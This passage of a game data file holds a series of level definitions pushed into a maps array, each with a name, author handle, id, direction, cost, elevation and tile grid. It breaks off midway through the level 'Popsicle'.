maps.push({name="34",author="fantasy",id="#1659991225",direction="forward",cost=177,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,5,5,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,8,7,0,7,6,5,5,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,7,6,5,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,7,6,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,6,5,8,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,7,7,8,17,0,0,0,0,0,0,0,5,5,5,5,6,7,7,7,7,9,9,10,13,0,0,0,0,5,5,5,5,8,8,8,8,7,9,9,10,10,13,17,23,0,0,0,0,5,7,9,9,9,9,13,13,13,13,13,17,17,17,21,23,0,0,0,0,5,7,9,13,17,21,21,17,17,21,21,21,21,21,22,23,0,0,0,0,5,7,10,13,21,21,21,22,22,24,24,24,24,24,23,0,0,0,0,0,0,5,10,10,17,17,17,17,21,21,21,22,24,23,23,0,0,0,0,0,0,0,5,5,7,6,10,7,10,10,17,17,17,21,22,0,0,0,0,0,0,0,0,0,5,5,5,5,5,7,6,6,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,6,5,0,0,0,0,0,0,0,0,0,0,0,0,0,8,9,8,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="35",author="fantasy",id="#1659991248",direction="left",cost=259,elevation=0,map=[1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,2,5,2,5,96,5,5,5,5,5,5,5,5,5,5,5,94,5,5,5,5,5,2,5,96,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,127,5,5,5,127,5,5,5,127,5,5,5,127,5,5,5,127,0,0,0,0,0,65,0,0,0,0,0,0,0,0,0,0,0,0,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,5,5,5,5,5,126,5,5,5,5,5,5,5,5,5,5,5,5,126,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,98,98,1,5,5,5,5,5,5,5,5,100,5,93,5,5,99,5,5,1,5,5,1,5,5,99,5,5,93,5,100,0,0,0,0,0,0,0,0,1,97,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="36",author="fantasy",id="#1659991272",direction="forward",cost=172,elevation=1,map=[0,94,0,0,0,24,24,24,2,2,24,24,24,0,0,0,93,59,39,39,0,44,0,0,0,24,3,58,58,58,58,3,24,0,0,0,59,59,39,39,0,44,0,0,0,24,58,58,94,93,58,58,24,0,0,0,0,0,0,0,0,44,0,0,0,24,58,58,58,58,58,58,24,0,0,0,0,0,0,0,0,44,0,0,0,0,24,24,38,38,24,24,0,0,0,0,0,0,92,92,0,44,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,39,39,0,44,44,43,42,41,40,39,38,38,0,0,0,0,0,0,0,0,0,0,0,44,44,43,42,41,40,39,38,38,0,0,0,42,42,41,41,40,40,39,0,92,92,0,0,0,0,0,0,0,0,0,0,42,42,41,41,40,40,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,39,39,0,0,0,0,0,44,44,0,44,44,44,44,44,44,44,0,0,0,39,39,0,0,0,0,0,44,44,0,44,44,44,44,44,44,44,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,44,44,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,44,44,0,44,44,0,0,0,0,0,0,0,0,0,39,39,39,39,39,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,39,100,44,44,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0]});
maps.push({name="37",author="fantasy",id="#1659991295",direction="right",cost=708,elevation=0,map=[1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,66,66,5,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,5,5,66,66,66,66,66,66,66,66,66,66,5,5,66,66,1,1,66,66,100,5,66,66,66,66,66,66,66,66,66,66,100,5,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,5,5,66,66,66,66,66,66,66,66,66,66,5,5,66,5,2,1,66,66,100,5,66,66,66,66,66,66,66,66,66,66,100,5,66,5,2,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="38",author="fantasy",id="#1659991321",direction="right",cost=932,elevation=0,map=[1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,76,76,5,5,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,76,76,5,5,76,5,76,76,76,5,76,76,76,76,5,5,76,76,1,1,76,76,100,5,76,76,76,5,76,76,76,5,76,76,100,5,76,76,1,1,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,76,76,5,5,76,76,76,76,76,76,76,76,76,76,76,5,76,76,1,1,76,76,5,5,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,76,76,5,5,76,76,76,76,76,76,76,76,76,76,5,76,76,76,1,1,76,76,5,5,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,76,76,5,5,76,76,76,76,76,76,76,76,76,76,76,5,76,76,1,1,76,76,5,5,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,76,76,5,5,76,76,76,76,76,76,76,76,76,76,5,76,76,76,1,1,76,76,5,5,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,76,76,5,5,76,5,5,5,5,5,5,5,5,76,5,5,76,5,2,1,76,76,100,5,76,5,5,5,5,5,5,5,5,76,100,5,76,5,2,1,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="39",author="fantasy",id="#1659991338",direction="right",cost=331,elevation=0,map=[1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,12,107,107,12,0,0,1,0,1,0,0,0,0,0,0,0,0,1,1,12,12,107,107,12,12,12,107,12,107,12,12,12,0,0,0,0,0,1,1,12,107,107,107,107,12,69,66,107,66,69,69,12,0,0,0,0,0,1,1,12,66,107,107,66,69,69,107,12,107,12,69,12,0,0,0,0,0,1,1,12,69,12,12,12,12,12,12,0,1,12,69,12,0,0,0,0,0,1,1,12,69,12,0,0,0,0,0,0,1,107,66,107,1,0,0,0,0,1,1,12,69,12,0,0,0,0,0,0,0,12,107,12,0,0,0,0,0,1,1,12,69,12,0,0,0,0,0,0,0,12,107,12,0,0,0,0,0,1,1,107,66,107,1,0,0,0,0,0,1,107,66,107,1,0,0,0,0,1,1,12,107,12,0,0,0,0,0,0,0,12,69,12,0,0,1,0,0,1,1,12,107,12,0,0,0,0,0,0,0,12,69,12,12,12,107,12,12,1,1,107,66,107,1,0,0,0,0,0,0,12,69,69,69,69,66,107,12,1,1,12,69,12,1,0,0,1,0,0,1,12,12,12,12,12,107,107,107,2,1,12,69,12,107,12,12,107,12,12,107,12,107,12,12,12,107,107,107,2,1,12,69,69,66,107,107,66,69,69,66,107,66,69,69,69,66,107,12,1,1,12,12,12,107,12,12,107,12,12,107,12,107,12,12,12,107,12,12,1,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="40",author="fantasy",id="#1659991356",direction="left",cost=166,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,119,119,119,119,119,119,119,119,119,0,0,0,0,0,0,0,0,0,119,119,119,119,119,119,119,119,119,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,2,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,0,0,119,119,2,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,0,0,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,0,0,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,0,0,119,119,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119]});
maps.push({name="Pit",author="MoistNoodlez",id="#1659995089",direction="forward",cost=600,elevation=-19,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,24,134,24,66,66,66,66,66,66,66,66,66,66,66,66,24,134,24,1,1,24,24,24,67,67,67,67,67,67,67,67,67,67,67,67,24,24,24,1,1,24,66,67,66,66,66,66,66,66,66,66,66,66,66,66,67,66,24,1,1,24,74,67,66,5,5,5,5,5,5,5,5,5,5,66,67,73,24,1,1,88,66,67,66,5,88,88,88,88,88,88,88,88,5,66,67,66,88,1,1,24,74,67,66,5,88,88,5,5,5,5,88,88,5,66,67,73,24,1,1,88,66,67,66,5,88,5,88,5,5,88,5,88,5,66,67,73,24,1,1,24,74,67,66,5,88,5,5,88,88,5,5,88,5,66,67,66,88,1,1,24,74,67,66,5,88,5,5,88,88,5,5,88,5,66,67,73,24,1,1,133,66,67,66,5,88,5,88,5,5,88,5,88,5,66,67,66,133,1,1,24,74,67,66,5,88,88,5,5,5,5,88,88,5,66,67,73,24,1,1,24,74,67,66,5,88,88,88,88,88,88,88,88,5,66,67,73,24,1,1,133,66,67,66,5,5,5,5,5,5,5,5,5,5,66,67,66,133,1,1,24,74,67,66,5,5,5,5,5,5,5,5,5,5,66,67,73,24,1,1,24,74,67,66,5,5,5,5,5,5,5,5,5,5,66,67,73,24,1,1,94,66,67,66,5,5,5,5,95,95,5,5,5,5,66,67,66,93,1,1,24,66,67,66,5,5,5,95,5,5,95,5,5,5,66,67,66,24,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="Park",author="MoistNoodlez",id="#1659995533",direction="forward",cost=307,elevation=-5,map=[0,0,1,1,1,2,2,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,14,14,13,13,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,1,14,14,13,13,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,1,90,14,13,13,14,90,14,14,14,90,14,1,0,0,0,0,0,0,0,1,14,14,13,13,14,14,66,66,66,14,14,1,0,0,0,0,0,0,0,1,90,14,13,13,14,90,66,66,66,90,14,1,0,0,0,0,0,0,0,1,14,14,13,13,14,14,66,66,66,14,14,1,0,0,0,0,0,0,0,1,90,14,12,12,14,90,66,66,66,90,14,1,0,0,0,0,0,0,0,1,14,14,12,12,14,14,66,66,66,14,14,1,0,0,0,0,0,0,0,1,90,14,12,12,14,90,66,66,66,90,14,1,0,0,0,0,0,0,0,1,14,14,12,12,14,14,66,66,66,14,14,1,0,0,0,0,0,0,0,1,90,14,12,12,14,90,14,14,14,90,14,1,0,0,0,0,0,0,0,1,14,14,12,12,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,1,90,14,11,11,10,10,10,10,9,9,14,1,0,0,0,0,0,0,0,1,14,14,11,11,10,10,10,10,9,9,14,1,0,0,0,0,0,0,0,1,90,14,14,14,14,14,14,14,48,48,14,1,0,0,0,0,0,0,0,1,14,14,90,14,90,14,90,14,91,91,14,1,0,0,0,0,0,0,0,1,14,90,14,90,14,90,14,14,48,48,14,1,0,0,0,0,0,0,0,1,14,14,93,14,94,14,90,14,48,48,14,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,2,2,1,1,0,0,0,0,0]});
maps.push({name="Beer",author="MoistNoodlez",id="#1659997030",direction="forward",cost=411,elevation=-10,map=[0,0,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,1,0,0,0,0,0,0,0,1,1,1,1,0,0,0,1,24,24,24,24,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,24,24,92,54,54,54,54,54,54,54,54,54,54,54,1,0,0,0,1,1,24,24,92,90,90,90,90,54,90,54,90,90,90,54,1,1,0,0,1,24,24,24,92,54,54,90,90,54,54,54,54,54,54,54,1,1,0,0,1,1,24,24,92,90,90,54,90,90,54,54,54,90,90,54,54,1,0,0,0,1,24,24,92,90,90,54,90,90,54,54,54,54,54,54,54,1,0,0,0,1,24,24,92,54,54,54,90,90,54,90,54,90,90,90,54,1,0,0,0,1,24,24,92,90,90,90,90,90,54,54,54,90,90,90,54,1,0,0,0,1,24,24,92,90,90,54,90,90,54,54,54,54,54,54,54,1,0,0,1,1,24,24,92,54,54,54,90,90,54,54,54,90,90,90,54,1,0,0,1,24,24,24,92,90,90,90,90,54,54,54,54,54,54,54,54,1,0,0,1,24,24,24,92,90,90,90,90,54,54,54,90,90,90,54,54,1,0,0,1,24,24,24,92,54,54,54,90,90,90,90,90,54,54,54,1,1,0,0,1,1,24,24,1,1,95,95,1,1,1,1,1,95,95,1,1,0,0,0,0,1,1,1,1,1,95,95,1,0,0,0,1,95,95,1,0,0,0,0,0,0,0,0,0,1,14,14,1,1,1,1,1,14,14,1,0,0,0,0,0,0,0,0,0,1,14,14,14,14,2,2,14,14,14,1,0,0]});
maps.push({name="Dissected",author="ZpLit",id="#1659998207",direction="forward",cost=266,elevation=0,map=[0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,76,68,68,76,1,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,68,68,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,68,68,5,5,5,5,5,0,0,0,0,0,0,0,5,5,5,5,90,5,68,68,5,90,5,5,5,5,0,0,0,0,0,0,90,5,5,5,0,1,69,69,1,0,5,5,5,90,0,0,0,0,0,0,5,97,5,0,0,1,69,69,1,0,0,5,99,5,0,0,0,0,0,0,98,98,98,0,94,1,69,69,1,94,0,96,96,96,0,0,0,0,0,0,95,95,95,0,28,1,69,69,1,28,0,95,95,95,0,0,0,0,0,0,5,5,5,0,0,1,69,69,1,0,0,5,5,5,0,0,0,0,0,0,5,5,5,90,0,1,69,69,1,0,90,5,5,5,0,0,0,0,0,0,90,5,5,5,5,91,68,68,91,5,5,5,5,90,0,0,0,0,0,0,0,5,5,5,5,91,68,68,91,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,91,68,68,91,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,68,68,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Water Climb",author="MoistNoodlez",id="#1659999134",direction="forward",cost=238,elevation=0,map=[0,1,2,2,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,1,5,5,1,0,0,0,0,0,0,1,24,24,24,95,24,24,24,1,0,1,127,127,1,0,0,0,0,0,0,1,24,24,24,95,24,24,24,1,0,1,0,0,1,0,0,0,0,0,0,1,24,24,24,95,24,24,24,1,0,1,0,0,1,0,0,0,0,0,0,1,66,66,1,1,1,127,127,1,0,1,0,0,1,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1,24,24,1,0,1,0,0,1,0,1,66,66,1,0,0,0,0,0,0,1,66,66,1,0,1,130,130,1,0,1,9,9,1,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,1,127,127,1,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,1,66,66,1,1,1,1,1,1,1,1,126,126,1,0,1,0,0,1,0,1,14,14,129,0,0,0,0,0,0,66,19,19,1,0,1,66,66,1,0,1,14,14,129,0,0,0,0,0,0,66,19,19,1,0,1,5,5,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1]});
maps.push({name="Arachnid",author="ZpLit",id="#1660012751",direction="forward",cost=216,elevation=0,map=[0,99,19,17,93,0,0,0,1,2,2,1,0,0,0,93,17,19,102,0,0,0,0,14,0,0,0,0,1,5,5,1,0,0,0,0,14,0,0,0,0,0,0,12,0,0,0,0,1,5,5,1,0,0,0,0,12,0,0,0,0,0,1,50,5,4,9,5,107,5,5,107,5,9,4,5,50,1,0,0,0,0,0,1,0,0,0,0,1,5,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,6,6,1,0,0,0,0,0,0,0,0,97,13,6,6,4,9,6,6,108,6,6,108,6,10,4,6,6,6,13,104,0,0,1,11,0,0,0,0,1,6,6,1,0,0,0,0,11,1,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,107,7,7,107,7,7,7,7,7,7,7,0,0,7,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,7,0,0,8,0,0,0,0,0,0,1,8,8,1,0,0,0,0,0,0,8,0,0,8,0,0,0,8,8,8,108,8,8,108,8,8,8,0,0,0,8,0,0,8,0,0,0,8,0,0,0,94,94,0,0,0,8,0,0,0,8,0,0,8,0,0,0,8,0,0,0,0,0,0,0,0,8,0,0,0,8,0,0,103,0,0,0,98,0,0,0,0,0,0,0,0,101,0,0,0,96,0,0,103,0,0,0,98,1,1,1,1,1,1,1,1,101,0,0,0,96,0,0,8,8,8,8,8,7,6,5,88,88,5,6,7,8,8,8,8,8,0,0,8,8,8,8,8,7,6,5,5,5,5,6,7,8,8,8,8,8,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0]});
maps.push({name="Why Are You Slow",author="Headhunterz",id="#1660016869",direction="forward",cost=488,elevation=3,map=[0,2,2,1,1,1,1,1,1,1,1,1,1,18,1,1,1,1,1,1,0,13,13,0,1,9,8,9,9,9,0,9,9,0,0,0,0,0,0,0,1,95,95,0,1,9,96,96,96,96,0,96,96,0,0,9,9,8,0,0,0,13,13,0,1,9,96,96,96,96,0,96,96,0,0,96,96,96,0,0,0,95,95,1,1,9,96,96,9,8,0,9,9,0,0,0,0,0,0,0,0,13,13,0,1,9,96,96,9,1,1,1,1,92,0,11,96,96,11,0,0,0,0,0,1,8,96,96,7,1,132,18,1,18,0,0,0,0,0,0,9,96,96,9,1,9,96,96,9,1,18,18,1,0,0,13,96,96,13,0,9,96,96,8,1,9,12,12,9,1,94,94,1,0,0,0,0,0,0,0,9,96,96,9,1,0,91,91,0,1,18,18,1,131,12,15,96,96,15,0,8,96,96,9,1,9,0,0,9,1,18,18,1,0,0,0,0,0,0,0,9,96,96,8,1,9,96,96,9,1,18,18,1,24,92,0,0,0,0,24,9,96,96,9,1,9,96,96,8,1,95,95,1,0,0,16,16,16,1,1,0,0,0,0,9,9,96,96,9,1,18,18,1,0,0,16,134,16,1,1,0,0,0,0,9,96,96,96,9,1,18,18,1,21,21,4,16,97,1,1,9,96,96,9,9,9,96,96,8,1,95,95,1,21,0,16,16,16,1,1,8,96,96,9,9,9,96,96,9,1,18,18,1,93,0,16,16,16,1,1,9,96,96,96,96,96,96,96,9,1,133,18,1,0,0,16,16,16,1,1,9,96,96,96,96,96,96,96,9,1,1,1,1,0,0,16,96,96,1,1,0,7,9,9,8,9,9,9,9,15,93,1,1,1,1,1,2,2,1,1]});
maps.push({name="ratrace",author="king buzzo",id="#1660053208",direction="forward",cost=424,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,24,1,24,24,24,24,24,1,24,24,24,24,24,1,24,90,24,24,1,24,24,1,24,86,24,24,86,1,24,86,24,86,24,1,24,24,24,90,1,24,24,1,24,24,1,24,24,1,24,24,24,24,24,1,24,24,1,24,1,24,24,1,24,24,1,24,24,1,24,24,1,24,24,1,24,86,1,24,1,24,90,1,24,90,1,90,90,1,24,90,1,24,24,1,24,24,1,24,1,24,24,1,24,24,1,24,24,1,24,90,1,24,24,1,24,24,1,24,1,90,24,1,24,24,1,24,86,1,24,24,1,24,24,1,90,24,1,24,1,24,24,1,90,24,1,24,24,1,24,24,1,24,24,1,24,90,1,24,1,24,90,1,24,24,1,24,24,1,86,24,1,24,24,1,24,24,1,24,1,24,24,1,24,24,1,24,24,1,24,24,1,24,86,1,90,24,1,24,1,24,24,1,90,90,1,24,90,1,24,24,1,24,24,1,24,90,1,24,1,24,24,1,24,24,1,90,24,1,24,24,1,24,24,1,86,24,1,24,1,86,24,1,24,24,1,24,24,1,24,24,1,24,24,1,24,24,1,24,1,24,24,1,24,90,1,86,24,1,24,86,1,24,24,1,24,86,1,24,1,24,24,1,90,24,1,24,24,1,24,24,1,24,24,1,24,24,1,24,1,24,86,1,24,24,1,24,24,1,90,24,1,86,24,1,24,24,1,24,1,24,24,24,24,90,1,24,24,24,24,90,1,24,86,24,24,24,1,24,1,24,24,24,24,24,1,24,24,24,24,24,1,24,24,24,24,24,1,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2]});
maps.push({name="lava water escape",author="king buzzo",id="#1660056495",direction="forward",cost=314,elevation=-4,map=[0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,16,2,2,16,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,49,49,16,1,0,0,0,0,16,16,0,0,0,0,0,16,16,0,0,16,90,49,90,0,0,0,0,16,76,76,16,0,0,0,16,66,66,16,0,16,49,90,16,0,0,0,16,83,83,83,81,16,0,16,73,73,73,71,16,90,49,49,16,0,0,16,76,82,76,76,81,90,16,66,72,66,66,71,90,16,49,49,16,0,0,16,76,82,76,76,81,16,16,66,72,66,66,71,16,16,49,49,90,0,0,0,16,82,84,84,84,16,0,16,72,74,74,74,16,16,49,49,16,0,0,0,0,16,82,82,16,0,0,0,16,66,66,16,0,90,29,29,90,0,0,0,0,16,77,77,16,0,0,0,0,16,16,0,0,16,29,29,16,0,0,0,0,10,82,82,10,0,0,0,0,0,0,0,0,16,30,30,16,1,0,0,0,10,77,77,10,0,0,0,0,0,0,0,0,16,31,31,90,0,1,0,0,5,76,76,5,0,0,0,0,0,0,0,0,16,32,32,16,0,0,1,0,5,90,5,5,0,0,0,0,0,0,0,0,90,33,33,16,0,0,1,0,0,5,5,0,0,0,0,0,0,0,0,0,16,34,34,16,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,16,35,35,90,0,1,0,0,5,5,5,5,0,0,0,0,0,0,0,0,16,16,16,16,1,0,0,0,91,91,91,91,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,91,91,91,91,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,91,2,2,91,0,0,1,0,0,0,0,0,1,0,0,0]});
maps.push({name="Skip",author="Headhunterz",id="#1660069910",direction="forward",cost=302,elevation=4,map=[1,0,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,1,1,0,10,10,95,95,95,95,10,0,0,0,0,0,0,0,0,0,0,1,1,0,10,10,95,95,95,95,10,0,0,0,0,0,0,0,0,0,0,1,1,0,10,86,10,10,95,95,10,0,14,14,14,14,93,93,14,14,131,1,1,0,10,10,0,10,95,95,10,0,14,14,14,14,14,14,14,14,14,1,1,0,10,10,0,10,95,95,10,0,0,0,0,0,0,0,0,0,0,1,1,0,10,10,0,10,95,95,10,0,0,0,0,0,0,0,0,0,0,1,1,0,86,10,0,10,95,95,10,0,0,0,0,0,0,0,0,0,0,1,1,0,10,10,0,4,0,0,4,0,0,0,0,0,0,0,0,0,0,1,1,0,10,11,12,14,14,14,14,14,14,14,95,95,14,14,95,95,14,1,1,0,10,11,12,14,14,14,14,14,14,14,95,95,14,14,95,95,14,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,1,14,14,0,0,14,132,14,14,14,14,95,14,14,95,95,14,14,14,1,1,97,14,0,0,14,14,14,96,96,14,95,14,14,95,95,14,14,14,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Popsicle",author="MoistNoodlez",id="#1660096620",direction="forward",cost=462,elevation=0,map=[0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,1,1,54,1,0,0,1,14,14,1,0,0,0,0,0,0,0,0,1,1,1,54,91,100,0,0,1,14,14,1,0,0,0,0,0,0,1,1,1,54,54,91,54,1,0,0,1,14,14,1,0,0,0,0,1,1,1,66,66,66,91,54,91,1,0,0,1,14,14,1,0,0,0,1,1,66,66,66,74,66,66,91,1,1,0,0,1,14,14,1,0,1,1,1,66,66,66,74,74,66,66,1,1,0,0,0,1,14,14,1,1,1,66,66,66,66,74,74,66,66,66,1,0,0,0,0,1,14,14,95,14,66,66,66,74,74,66,66,66,66,14,1,0,0,0,1,1,14,14,95,66,66,66,74,66,66,66,66,66,1,14,1,0,0,1,1,14,95,76,66,66,66,74,66,66,66,66,1,1,76,14,1,0,0,1,114,14,76,66,66,74,74,66,66,66,66,1,76,76,76,14,1,0,0,1,114,14,76,66,74,66,66,66,66,66,1,76,76,76,7